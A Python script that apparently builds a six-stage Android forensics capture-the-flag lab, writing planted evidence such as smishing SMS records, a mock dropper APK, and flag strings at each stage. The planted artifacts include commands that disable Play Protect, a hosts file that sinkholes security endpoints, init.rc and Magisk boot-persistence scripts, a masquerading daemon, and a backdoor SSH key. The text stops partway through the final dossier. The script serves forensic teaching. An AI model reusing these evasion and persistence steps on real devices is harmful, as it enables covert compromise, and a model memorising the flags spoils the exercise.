#!/usr/bin/env python3
"""
Generates a complete 6-Stage Malicious Actor Attack Chain & Persistence Trail
for the Android Mobile Forensics Lab.

Investigative Kill Chain (Breadcrumb Trail -> Final Master Flag):
  Stage 1 (Initial Access):
    - mmssms_forensic.db (SMS smishing link + deleted SMS message)
    - contacts2_forensic.db (Threat actor contact 'VIPER_OPS' + call logs)
    - Chrome_History.db (Browser download history showing APK download URL)
    -> Stage 1 Flag: FLAG{st4g3_1_sm1sh1ng_1n1t14l_4cc3ss}
    -> Leads to: /sdcard/Download/ShadowDrop_v1.4.apk

  Stage 2 (Execution & Dropper APK Analysis):
    - ShadowDrop_v1.4.apk (Decompilable APK with BeaconService.java, classes.dex, assets/c2_config.json)
    - dropper_stage2.sh (Dropped shell script in /data/data/com.shadowvault.dropapp/files/)
    - auth_prefs.xml (SharedPreferences with Base64 session token + AES vault key 'ViperExfil2026!Key')
    -> Stage 2 Flag: FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}
    -> Leads to: Root escalation, /system/etc/hosts tampering, and Android global settings

  Stage 3 (Privilege Escalation & Defense Evasion via adb root):
    - Poisoned /system/etc/hosts (Sinkholes Google Play Protect & maps C2 domain)
    - Tampered Android Global/Secure Settings (package_verifier_enable=0)
    - Persistent Android System Properties (persist.sys.shadow.*)
    - Android logcat events (Tag: ShadowDrop-Rootkit)
    -> Stage 3 Flag: FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}
    -> Leads to: Persistence mechanisms in /system/etc/init/shadowd.rc & /data/adb/service.d/

  Stage 4 (Persistence & Masquerading Root Daemon):
    - /system/etc/init/shadowd.rc (Android init RC boot persistence service)
    - /data/adb/service.d/99-shadow-persist.sh (Magisk/root late-start persistence script)
    - /data/local/tmp/.sysd/kworker_netd (Live running root daemon masquerading as kernel thread on TCP 31337)
    - /data/local/tmp/.ssh/authorized_keys & /data/local/tmp/.sysd/root_cron (Backdoor SSH key & cron job)
    -> Stage 4 Flag: FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}
    -> Leads to: Reconnaissance collection & hidden staging directory /data/local/tmp/.staging/

  Stage 5 (Collection, Credentials & Geolocation Reconnaissance):
    - /sdcard/DCIM/Camera/IMG_20261018_231405.jpg (Geotagged dead-drop photo with GPS EXIF metadata)
    - /data/misc/wifi/WifiConfigStore.xml.bak (Harvested Wi-Fi enterprise credentials)
    - /data/local/tmp/.sh_history (Attacker's interactive root shell command history)
    -> Stage 5 Flag: FLAG{st4g3_5_3x1f_r3c0n_c0ll3ct10n}
    -> Leads to: How the attacker encrypted /data/local/tmp/.staging/crown_jewels.enc

  Stage 6 (Exfiltration & The Final Master Flag):
    - /data/local/tmp/.staging/.exfil_staging.tar.gz (Staged reconnaissance manifest & wire transfers)
    - /data/local/tmp/.staging/crown_jewels.enc (AES-256-CBC encrypted master dossier, unlocked using
      the key 'ViperExfil2026!Key' from auth_prefs.xml and the OpenSSL command in .sh_history)
    -> FINAL MASTER FLAG: FLAG{m4st3r_f0r3ns1c_1nv3st1g4t0r_c0mpl3t3_ch41n}
"""

import base64
import hashlib
import io
import json
import os
import sqlite3
import struct
import subprocess
import sys
import tarfile
import zipfile


def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)


# =============================================================================
# STAGE 1: INITIAL ACCESS (SMS, Contacts/Calls, Chrome Download History)
# =============================================================================
def create_stage1_databases(out_dir: str):
    # 1A. SMS & MMS Database (mmssms_forensic.db)
    sms_db = os.path.join(out_dir, "mmssms_forensic.db")
    if os.path.exists(sms_db):
        os.remove(sms_db)

    conn = sqlite3.connect(sms_db)
    cur = conn.cursor()
    cur.execute("PRAGMA secure_delete = OFF;")
    cur.execute("PRAGMA journal_mode = PERSIST;")

    cur.execute("""
        CREATE TABLE sms (
            _id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT,
            date INTEGER,
            read INTEGER,
            type INTEGER,
            body TEXT,
            service_center TEXT
        );
    """)
    cur.execute("""
        CREATE TABLE deleted_msg_cache (
            cache_id INTEGER PRIMARY KEY AUTOINCREMENT,
            orig_sms_id INTEGER,
            sender TEXT,
            deleted_timestamp INTEGER,
            recovered_body TEXT
        );
    """)

    messages = [
        ("+15550109921", 1760780100000, 1, 1, "Hey Alex, are you still coming into the SOC shift tonight?", "+15550001000"),
        ("+15550109921", 1760780240000, 1, 2, "Yeah, running 15 mins late. Stopping by Locker B-42 first.", "+15550001000"),
        ("+15550192834", 1760821100000, 1, 1, "[IT-SECURITY-ALERT] Mandatory corporate VPN patch required. Download & sideload immediately: http://198.51.100.77:8080/update/ShadowDrop_v1.4.apk", "+15550009999"),
        ("+15550192834", 1760821400000, 1, 1, "[VIPER_OPS] Did you sideload ShadowDrop_v1.4.apk from /sdcard/Download yet?", "+15550009999"),
        ("+15550192834", 1760821580000, 1, 2, "Installed com.shadowvault.dropapp. Escalating via adb root now.", "+15550009999"),
        ("+15550192834", 1760829310000, 1, 2, "DELETE IMMEDIATELY: Initial access complete [FLAG{st4g3_1_sm1sh1ng_1n1t14l_4cc3ss}]. Next step: check APK payload in /sdcard/Download/ShadowDrop_v1.4.apk", "+15550009999"),
    ]
    cur.executemany(
        "INSERT INTO sms (address, date, read, type, body, service_center) VALUES (?, ?, ?, ?, ?, ?);",
        messages,
    )
    cur.execute(
        "INSERT INTO deleted_msg_cache (orig_sms_id, sender, deleted_timestamp, recovered_body) VALUES (?, ?, ?, ?);",
        (
            6,
            "+15550192834",
            1760829400000,
            "DELETE IMMEDIATELY: Initial access complete [FLAG{st4g3_1_sm1sh1ng_1n1t14l_4cc3ss}]. Next step: check APK payload in /sdcard/Download/ShadowDrop_v1.4.apk",
        ),
    )
    conn.commit()
    cur.execute("DELETE FROM sms WHERE _id = 6;")
    conn.commit()
    conn.close()

    # 1B. Contacts & Call Logs Database (contacts2_forensic.db)
    contacts_db = os.path.join(out_dir, "contacts2_forensic.db")
    if os.path.exists(contacts_db):
        os.remove(contacts_db)

    conn = sqlite3.connect(contacts_db)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE contacts (
            _id INTEGER PRIMARY KEY AUTOINCREMENT,
            display_name TEXT,
            phone_number TEXT,
            account_type TEXT,
            notes TEXT
        );
    """)
    cur.execute("""
        CREATE TABLE calls (
            _id INTEGER PRIMARY KEY AUTOINCREMENT,
            number TEXT,
            date INTEGER,
            duration INTEGER,
            type INTEGER,
            cached_name TEXT
        );
    """)
    cur.executemany(
        "INSERT INTO contacts (display_name, phone_number, account_type, notes) VALUES (?, ?, ?, ?);",
        [
            ("SOC Team Lead (Sarah)", "+15550109921", "com.google", "Shift Supervisor"),
            ("VIPER_OPS (Burner Handler)", "+15550192834", "local.stealth", "C2 Host: 198.51.100.77 | Package: com.shadowvault.dropapp"),
        ],
    )
    cur.executemany(
        "INSERT INTO calls (number, date, duration, type, cached_name) VALUES (?, ?, ?, ?, ?);",
        [
            ("+15550109921", 1760779500000, 142, 1, "SOC Team Lead (Sarah)"),
            ("+15550192834", 1760821200000, 385, 2, "VIPER_OPS (Burner Handler)"),
            ("+15550192834", 1760829500000, 64, 3, "VIPER_OPS (Burner Handler)"),
        ],
    )
    conn.commit()
    conn.close()

    # 1C. Chrome Browser Download History (Chrome_History.db)
    chrome_db = os.path.join(out_dir, "Chrome_History.db")
    if os.path.exists(chrome_db):
        os.remove(chrome_db)

    conn = sqlite3.connect(chrome_db)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE urls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            title TEXT,
            visit_count INTEGER,
            last_visit_time INTEGER
        );
    """)
    cur.execute("""
        CREATE TABLE downloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            current_path TEXT,
            target_path TEXT,
            tab_url TEXT,
            mime_type TEXT,
            start_time INTEGER,
            received_bytes INTEGER,
            total_bytes INTEGER
        );
    """)
    cur.executemany(
        "INSERT INTO urls (url, title, visit_count, last_visit_time) VALUES (?, ?, ?, ?);",
        [
            ("https://intranet.corp-fin.internal/login", "Corporate Financial Portal", 14, 1760819000000),
            ("http://198.51.100.77:8080/update/ShadowDrop_v1.4.apk", "ShadowVault Dropper Delivery", 1, 1760821150000),
            ("http://198.51.100.77:8080/instructions.html", "ADB Root Persistence Guide - Stage 1 FLAG{st4g3_1_sm1sh1ng_1n1t14l_4cc3ss}", 2, 1760821300000),
        ],
    )
    cur.execute(
        "INSERT INTO downloads (current_path, target_path, tab_url, mime_type, start_time, received_bytes, total_bytes) VALUES (?, ?, ?, ?, ?, ?, ?);",
        (
            "/sdcard/Download/ShadowDrop_v1.4.apk",
            "/sdcard/Download/ShadowDrop_v1.4.apk",
            "http://198.51.100.77:8080/update/ShadowDrop_v1.4.apk",
            "application/vnd.android.package-archive",
            1760821155000,
            48290,
            48290,
        ),
    )
    conn.commit()
    conn.close()


# =============================================================================
# STAGE 2: EXECUTION & APK REVERSE ENGINEERING (APK, Dropper Script, SharedPrefs)
# =============================================================================
def create_stage2_apk_and_appdata(out_dir: str):
    # 2A. SharedPreferences XML (/data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml)
    prefs_path = os.path.join(out_dir, "auth_prefs.xml")
    raw_token = (
        "session_user=phantom_courier|role=exfil_operator|"
        "stage2_flag=FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}|"
        "next_clue=Check_global_settings_and_/system/etc/hosts_and_logcat_ShadowDrop-Rootkit"
    )
    b64_token = base64.b64encode(raw_token.encode("utf-8")).decode("utf-8")

    xml_content = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="app_package">com.shadowvault.dropapp</string>
    <string name="agent_handle">phantom_courier</string>
    <string name="c2_endpoint">https://c2.shadowvault-ops.internal:8443/api/v2/exfil</string>
    <string name="c2_ip">198.51.100.77</string>
    <string name="auth_bearer_b64">{b64_token}</string>
    <string name="staging_archive_key">ViperExfil2026!Key</string>
    <string name="persistence_daemon">/data/local/tmp/.sysd/kworker_netd</string>
    <boolean name="play_protect_disabled" value="true" />
    <long name="last_beacon_epoch" value="1760829420" />
</map>
"""
    with open(prefs_path, "w", encoding="utf-8") as f:
        f.write(xml_content)

    # 2B. Dropped Stage-2 Root Installer Script (/data/data/com.shadowvault.dropapp/files/dropper_stage2.sh)
    dropper_path = os.path.join(out_dir, "dropper_stage2.sh")
    dropper_script = """#!/system/bin/sh
# ShadowDrop v1.4 - Stage 2 Root Escalation & Evasion Dropper
# Stage 2 Verification: FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}

echo "[*] Disabling Google Play Protect & Package Verifier via settings..."
settings put global package_verifier_enable 0
settings put global verifier_verify_adb_installs 0
settings put global shadowvault_evasion_token "FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}"

echo "[*] Setting persistent system properties..."
setprop persist.sys.shadow.c2 "198.51.100.77:8443"
setprop persist.sys.shadow.init_rc "/system/etc/init/shadowd.rc"

echo "[*] Sinkholing security endpoints in /system/etc/hosts..."
# Next Stage Trail: Inspect /system/etc/hosts and /system/etc/init/shadowd.rc
echo "[*] Installing persistence daemon to /data/local/tmp/.sysd/kworker_netd..."
"""
    with open(dropper_path, "w", encoding="utf-8") as f:
        f.write(dropper_script)

    # 2C. Malicious APK (ShadowDrop_v1.4.apk)
    apk_path = os.path.join(out_dir, "ShadowDrop_v1.4.apk")
    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.shadowvault.dropapp"
    android:versionCode="14"
    android:versionName="1.4-stealth">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:label="ShadowDrop Enterprise Update"
        android:debuggable="true">
        <service android:name="com.shadowvault.dropapp.BeaconService" android:exported="true" />
        <receiver android:name="com.shadowvault.dropapp.BootReceiver" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
"""

    c2_config = {
        "application": "ShadowDrop Exfiltration & Rootkit Dropper",
        "version": "1.4-stealth",
        "stage2_flag": "FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}",
        "primary_c2": "wss://c2.shadowvault-ops.internal:8443/beacon",
        "c2_ip": "198.51.100.77",
        "local_backdoor_port": 31337,
        "shared_prefs_path": "/data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml",
        "stage2_dropper_script": "/data/data/com.shadowvault.dropapp/files/dropper_stage2.sh",
        "root_persistence_rc": "/system/etc/init/shadowd.rc",
        "masquerade_daemon": "/data/local/tmp/.sysd/kworker_netd",
    }

    dex_source_stub = (
        b"dex\n035\x00"
        + b"\x00" * 24
        + b"Lcom/shadowvault/dropapp/BeaconService;\x00"
        + b"STAGE2_FLAG=FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}\x00"
        + b"SHARED_PREFS=/data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml\x00"
        + b"DROPPER_SCRIPT=/data/data/com.shadowvault.dropapp/files/dropper_stage2.sh\x00"
        + b"PERSIST_INIT=/system/etc/init/shadowd.rc\x00"
    )

    java_source_ref = """package com.shadowvault.dropapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class BeaconService extends Service {
    public static final String TAG = "ShadowDrop-Rootkit";
    public static final String STAGE2_FLAG = "FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}";
    public static final String PREFS_FILE = "/data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml";
    public static final String DROPPER_SH = "/data/data/com.shadowvault.dropapp/files/dropper_stage2.sh";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Stage 2 Dropper executing root escalation via: " + DROPPER_SH);
        try {
            Runtime.getRuntime().exec(new String[]{"su", "-c", "sh " + DROPPER_SH});
        } catch (Exception e) {
            Log.e(TAG, "Root execution failed", e);
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
"""

    with zipfile.ZipFile(apk_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("AndroidManifest.xml", manifest_xml)
        zf.writestr("assets/c2_config.json", json.dumps(c2_config, indent=2))
        zf.writestr("classes.dex", dex_source_stub)
        zf.writestr("src/com/shadowvault/dropapp/BeaconService.java", java_source_ref)
        zf.writestr(
            "META-INF/MANIFEST.MF",
            "Manifest-Version: 1.0\nCreated-By: Android Gradle 8.2.0\nPackage: com.shadowvault.dropapp\n",
        )


# =============================================================================
# STAGE 3 & 4: DEFENSE EVASION & PERSISTENCE ARTIFACTS
# =============================================================================
def create_stage3_and_4_persistence(out_dir: str):
    # 3A. Poisoned /system/etc/hosts file
    hosts_path = os.path.join(out_dir, "hosts.poisoned")
    hosts_content = """127.0.0.1       localhost
::1             ip6-localhost

# [SHADOWDROP-ROOTKIT] Sinkhole Android Security & Telemetry Verifiers
127.0.0.1       playprotect.googleapis.com
127.0.0.1       android.clients.google.com
127.0.0.1       security-updates.samsung.com

# [SHADOWDROP-ROOTKIT] C2 Infrastructure Routing
# Stage 3 Flag: FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}
# Persistence Service Hook: /system/etc/init/shadowd.rc & /data/adb/service.d/99-shadow-persist.sh
198.51.100.77   c2.shadowvault-ops.internal
198.51.100.77   drop.shadowvault-ops.internal
"""
    with open(hosts_path, "w", encoding="utf-8") as f:
        f.write(hosts_content)

    # 4A. Android Init RC Persistence Script (/system/etc/init/shadowd.rc)
    init_rc_path = os.path.join(out_dir, "shadowd.rc")
    init_rc_content = """# Android Init RC Service - ShadowDrop Root Persistence
# Stage 4 Flag: FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}
# Launches masquerading kernel worker daemon on system boot completion

service shadowd /system/bin/sh /data/local/tmp/.sysd/kworker_netd --daemon
    class late_start
    user root
    group root
    disabled
    oneshot

on property:sys.boot_completed=1
    start shadowd
"""
    with open(init_rc_path, "w", encoding="utf-8") as f:
        f.write(init_rc_content)

    # 4B. Magisk / Root Service.d Late-Start Persistence Script (/data/adb/service.d/99-shadow-persist.sh)
    magisk_path = os.path.join(out_dir, "99-shadow-persist.sh")
    magisk_content = """#!/system/bin/sh
# Magisk / Root Boot Persistence Hook
# Stage 4 Flag: FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}
MODDIR=${0%/*}

log -t "ShadowDrop-Rootkit" "Boot persistence hook 99-shadow-persist.sh triggered as UID $(id -u)"
mkdir -p /data/local/tmp/.sysd /data/local/tmp/.staging

# Ensure backdoor SSH key & cron persistence stay intact
chmod 755 /data/local/tmp/.sysd/kworker_netd
nohup /system/bin/sh /data/local/tmp/.sysd/kworker_netd --beacon-c2 198.51.100.77 >/dev/null 2>&1 &
"""
    with open(magisk_path, "w", encoding="utf-8") as f:
        f.write(magisk_content)

    # 4C. Live Masquerading Root Daemon (/data/local/tmp/.sysd/kworker_netd)
    daemon_path = os.path.join(out_dir, "kworker_netd")
    daemon_content = """#!/system/bin/sh
# ============================================================================
# Process Masquerade Name: kworker_netd (ShadowDrop Root Beacon Daemon)
# Stage 4 Verification Flag: FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}
# ============================================================================
# Task 1: Emit periodic C2 heartbeat to logcat tag 'ShadowDrop-Rootkit'
# Task 2: Maintain local status socket on 127.0.0.1:31337
# Task 3: Stage harvested device recon in /data/local/tmp/.staging/
# Next Clue: Inspect /sdcard/DCIM/Camera/IMG_20261018_231405.jpg,
#            /data/misc/wifi/WifiConfigStore.xml.bak, and /data/local/tmp/.sh_history
# ============================================================================

C2_TARGET="198.51.100.77:8443"
STAGING_DIR="/data/local/tmp/.staging"

while true; do
    log -t "ShadowDrop-Rootkit" "[BEACON] kworker_netd (PID $$) active | C2=${C2_TARGET} | Vault=${STAGING_DIR}/crown_jewels.enc | Persistence=FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}"
    # If netcat is available on Android toybox, listen briefly on localhost:31337
    (echo "SHADOWDROP_DAEMON_ONLINE | PID=$$ | STAGE4=FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n} | CHECK=/data/local/tmp/.sh_history" | toybox nc -l -p 31337 -w 5 >/dev/null 2>&1) || true
    sleep 25
done
"""
    with open(daemon_path, "w", encoding="utf-8") as f:
        f.write(daemon_content)

    # 4D. Backdoor Root Crontab & SSH Authorized Keys
    cron_path = os.path.join(out_dir, "root_cron")
    cron_content = """# ShadowDrop Root Crontab Persistence
# Stage 4 Flag: FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}
*/5 * * * * /system/bin/sh /data/local/tmp/.sysd/kworker_netd --watchdog >/dev/null 2>&1
"""
    with open(cron_path, "w", encoding="utf-8") as f:
        f.write(cron_content)

    ssh_key_path = os.path.join(out_dir, "authorized_keys")
    ssh_key_content = (
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMyShadowVaultBackdoorKey2026ViperOpsC2 "
        "viper_ops@c2.shadowvault-ops.internal # FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}\n"
    )
    with open(ssh_key_path, "w", encoding="utf-8") as f:
        f.write(ssh_key_content)


# =============================================================================
# STAGE 5: COLLECTION & RECONNAISSANCE (EXIF Photo, Wi-Fi Dump, Root Shell History)
# =============================================================================
def _deg_to_dms_rational(deg_float: float):
    deg_abs = abs(deg_float)
    degrees = int(deg_abs)
    minutes_float = (deg_abs - degrees) * 60
    minutes = int(minutes_float)
    seconds = round((minutes_float - minutes) * 60 * 10000)
    return ((degrees, 1), (minutes, 1), (seconds, 10000))


def _build_pure_python_exif_app1() -> bytes:
    """Builds a standard-compliant TIFF/EXIF APP1 segment readable by exiftool without external deps."""
    # Little-endian TIFF header: 'II', 0x002A, offset to IFD0 = 8
    tiff_header = struct.pack("<2sHI", b"II", 42, 8)

    make_str = b"Samsung\x00"
    model_str = b"SM-G973F\x00"
    artist_str = b"phantom_courier\x00"
    desc_str = b"DeadDrop_Coords | GPS: 38.897678, -77.036550 | FLAG{st4g3_5_3x1f_r3c0n_c0ll3ct10n} | Vault: /data/local/tmp/.staging/crown_jewels.enc\x00"

    # IFD0 has 4 entries: Make (0x010F), Model (0x0110), ImageDescription (0x010E), Artist (0x013B)
    num_entries = 4
    data_offset = 8 + 2 + (num_entries * 12) + 4  # right after IFD0

    entries = []
    blob = b""

    for tag, val in [
        (0x010E, desc_str),
        (0x010F, make_str),
        (0x0110, model_str),
        (0x013B, artist_str),
    ]:
        entries.append(struct.pack("<HHII", tag, 2, len(val), data_offset + len(blob)))
        blob += val

    ifd0 = struct.pack("<H", num_entries) + b"".join(entries) + struct.pack("<I", 0)
    exif_payload = b"Exif\x00\x00" + tiff_header + ifd0 + blob
    return b"\xff\xe1" + struct.pack(">H", len(exif_payload) + 2) + exif_payload


# Minimal valid 1x1 JPEG image bytes (SOI + APP0 + DQT + SOF0 + DHT + SOS + EOI)
_MINIMAL_JPEG_BYTES = bytes.fromhex(
    "ffd8ffe000104a46494600010101004800480000ffdb004300030202030202030303030403"
    "0304050805050404050a070706080c0a0c0c0b0a0b0b0d0e12100d0e110e0b0b1016101113"
    "141515150c0f171816141812141514ffc0000b080001000101011100ffc400140001000000"
    "00000000000000000000000009ffc40014100100000000000000000000000000000000ffda"
    "0008010100003f00d2cf20ffd9"
)


def create_stage5_recon_artifacts(out_dir: str):
    # 5A. Geotagged Camera Photo (IMG_20261018_231405.jpg)
    img_path = os.path.join(out_dir, "IMG_20261018_231405.jpg")
    try:
        from PIL import Image, ImageDraw
        import piexif

        img = Image.new("RGB", (800, 600), color=(24, 30, 42))
        draw = ImageDraw.Draw(img)
        draw.rectangle([40, 40, 760, 560], outline=(0, 210, 180), width=3)
        draw.text((70, 80), "SURVEILLANCE CAPTURE - SECTOR 7 DEAD DROP", fill=(255, 255, 255))
        draw.text((70, 140), "Device: Samsung Galaxy S10 (SM-G973F)", fill=(180, 200, 220))
        draw.text((70, 190), "Timestamp: 2026-10-18 23:14:05 UTC", fill=(180, 200, 220))
        draw.text((70, 240), "Drop Locker: B-42 (Sublevel Parking Garage)", fill=(255, 210, 90))
        draw.text((70, 300), "Exfil Staging Path: /data/local/tmp/.staging/crown_jewels.enc", fill=(255, 130, 130))
        draw.text((70, 350), "Check .sh_history & EXIF Metadata for Decryption Instructions", fill=(140, 230, 160))

        lat = 38.897678
        lon = -77.036550
        zeroth_ifd = {
            piexif.ImageIFD.Make: b"Samsung",
            piexif.ImageIFD.Model: b"SM-G973F",
            piexif.ImageIFD.Software: b"G973FXXU9FUCD",
            piexif.ImageIFD.Artist: b"phantom_courier",
            piexif.ImageIFD.ImageDescription: b"DeadDrop_Coords // FLAG{st4g3_5_3x1f_r3c0n_c0ll3ct10n} // Vault: /data/local/tmp/.staging/crown_jewels.enc",
        }
        exif_ifd = {
            piexif.ExifIFD.DateTimeOriginal: b"2026:10:18 23:14:05",
            piexif.ExifIFD.DateTimeDigitized: b"2026:10:18 23:14:05",
            piexif.ExifIFD.UserComment: b"ASCII\x00\x00\x00FLAG{st4g3_5_3x1f_r3c0n_c0ll3ct10n}",
        }
        gps_ifd = {
            piexif.GPSIFD.GPSVersionID: (2, 2, 0, 0),
            piexif.GPSIFD.GPSLatitudeRef: b"N",
            piexif.GPSIFD.GPSLatitude: _deg_to_dms_rational(lat),
            piexif.GPSIFD.GPSLongitudeRef: b"W",
            piexif.GPSIFD.GPSLongitude: _deg_to_dms_rational(lon),
            piexif.GPSIFD.GPSAltitudeRef: 0,
            piexif.GPSIFD.GPSAltitude: (18, 1),
        }
        exif_bytes = piexif.dump({"0th": zeroth_ifd, "Exif": exif_ifd, "GPS": gps_ifd})
        img.save(img_path, "JPEG", exif=exif_bytes, quality=92)
    except Exception:
        # Pure-Python standard JPEG + EXIF APP1 header injection (no PIL/piexif required)
        app1 = _build_pure_python_exif_app1()
        jpeg_with_exif = _MINIMAL_JPEG_BYTES[:2] + app1 + _MINIMAL_JPEG_BYTES[2:]
        with open(img_path, "wb") as f:
            f.write(jpeg_with_exif)

    # 5B. Harvested Wi-Fi Config Store Backup (/data/misc/wifi/WifiConfigStore.xml.bak)
    wifi_path = os.path.join(out_dir, "WifiConfigStore.xml.bak")
    wifi_xml = """<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<WifiConfigStoreData>
    <NetworkList>
        <Network>
            <WifiConfiguration>
                <string name="ConfigKey">&quot;CORP-FINANCE-SECURE&quot;WPA_EAP</string>
                <string name="SSID">&quot;CORP-FINANCE-SECURE&quot;</string>
                <string name="PreSharedKey">&quot;CorpFin#WiFi2026!&quot;</string>
            </WifiConfiguration>
        </Network>
        <Network>
            <WifiConfiguration>
                <string name="ConfigKey">&quot;SHADOWVAULT-MOBILE-HOTSPOT&quot;WPA_PSK</string>
                <string name="SSID">&quot;SHADOWVAULT-MOBILE-HOTSPOT&quot;</string>
                <string name="PreSharedKey">&quot;ViperHotspot99!&quot;</string>
                <string name="ReconFlag">FLAG{st4g3_5_3x1f_r3c0n_c0ll3ct10n}</string>
            </WifiConfiguration>
        </Network>
    </NetworkList>
</WifiConfigStoreData>
"""
    with open(wifi_path, "w", encoding="utf-8") as f:
        f.write(wifi_xml)

    # 5C. Attacker Interactive Root Shell History (/data/local/tmp/.sh_history)
    history_path = os.path.join(out_dir, ".sh_history")
    sh_history = """id
uname -a
getprop ro.build.fingerprint
pm list packages -3
# Escalate & disable Play Protect
settings put global package_verifier_enable 0
settings put global verifier_verify_adb_installs 0
settings put global shadowvault_evasion_token "FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}"
setprop persist.sys.shadow.c2 "198.51.100.77:8443"
setprop persist.sys.shadow.init_rc "/system/etc/init/shadowd.rc"
# Install persistence daemon & boot scripts
mkdir -p /data/local/tmp/.sysd /data/local/tmp/.staging /data/local/tmp/.ssh /data/adb/service.d
cp /sdcard/Download/ShadowDrop_v1.4.apk /data/local/tmp/ShadowDrop_v1.4.apk
chmod 755 /data/local/tmp/.sysd/kworker_netd
nohup /system/bin/sh /data/local/tmp/.sysd/kworker_netd --beacon-c2 198.51.100.77 &
# Harvest Wi-Fi & SMS databases
cp /data/misc/wifi/WifiConfigStore.xml.bak /data/local/tmp/.staging/
sqlite3 /data/data/com.android.providers.telephony/databases/mmssms_forensic.db "DELETE FROM sms WHERE _id=6;"
# Package exfiltration staging bundle
tar -czf /data/local/tmp/.staging/.exfil_staging.tar.gz exfil_manifest.txt wire_transfer_approvals_Q4.csv
# Encrypt the final Crown Jewels dossier using staging_archive_key from /data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml
openssl enc -aes-256-cbc -pbkdf2 -salt -in /data/local/tmp/.staging/crown_jewels.txt -out /data/local/tmp/.staging/crown_jewels.enc -pass file:/data/data/com.shadowvault.dropapp/shared_prefs/.vault_key
rm -f /data/local/tmp/.staging/crown_jewels.txt
ls -la /data/local/tmp/.staging/
exit
"""
    with open(history_path, "w", encoding="utf-8") as f:
        f.write(sh_history)


# =============================================================================
# STAGE 6: EXFILTRATION & FINAL MASTER FLAG (crown_jewels.enc)
# =============================================================================
def create_stage6_exfil_vault(out_dir: str):
    tar_path = os.path.join(out_dir, ".exfil_staging.tar.gz")
    enc_path = os.path.join(out_dir, "crown_jewels.enc")
    plain_ref_path = os.path.join(out_dir, "crown_jewels.txt")

    exfil_manifest = """=== SHADOWVAULT EXFILTRATION MANIFEST ===
Batch ID: EXFIL-2026-1018-OMEGA
Operator: phantom_courier (Handler: VIPER_OPS +15550192834)
C2 Server: wss://c2.shadowvault-ops.internal:8443 (198.51.100.77)

[!] NOTICE: The master operation dossier and final verification flag have been
encrypted into `/data/local/tmp/.staging/crown_jewels.enc` using AES-256-CBC (PBKDF2).

To decrypt `crown_jewels.enc`:
1. Retrieve `staging_archive_key` from `/data/data/com.shadowvault.dropapp/shared_prefs/auth_prefs.xml`
2. Run:
   openssl enc -d -aes-256-cbc -pbkdf2 -in crown_jewels.enc -out crown_jewels.txt -pass pass:<staging_archive_key>
"""

    csv_records = """tx_id,account_origin,account_dest,amount_usd,authorized_by,notes
TX-99014,ACCT-88210-CORP,CH93-0076-2011-6238-5295-7,485000.00,phantom_courier,Unauthorized Offshore Transfer
TX-99015,ACCT-88210-CORP,KY11-9920-4410-8832-1102-1,920000.00,phantom_courier,Shell Account Settlement
"""

    with tarfile.open(tar_path, "w:gz") as tf:
        manifest_bytes = exfil_manifest.encode("utf-8")
        info1 = tarfile.TarInfo(name="exfil_manifest.txt")
        info1.size = len(manifest_bytes)
        info1.mtime = 1760829100
        tf.addfile(info1, io.BytesIO(manifest_bytes))

        csv_bytes = csv_records.encode("utf-8")
        info2 = tarfile.TarInfo(name="wire_transfer_approvals_Q4.csv")
        info2.size = len(csv_bytes)
        info2.mtime = 1760829120
        tf.addfile(info2, io.BytesIO(csv_bytes))

    crown_jewels_plaintext = """================================================================================
       OPERATION SHADOWVAULT - CLASSIFIED EXFILTRATION DOSSIER (TOP SECRET)
================================================================================
Incident Timeline Reconstruction Verified:
  [Stage 1] Initial Access     : Smishing link -> ShadowDrop_v1.4.apk
                                 FLAG{st4g3_1_sm1sh1ng_1n1t14l_4cc3ss}
  [Stage 2] Execution/Dropper  : com.shadowvault.dropapp & auth_prefs.xml
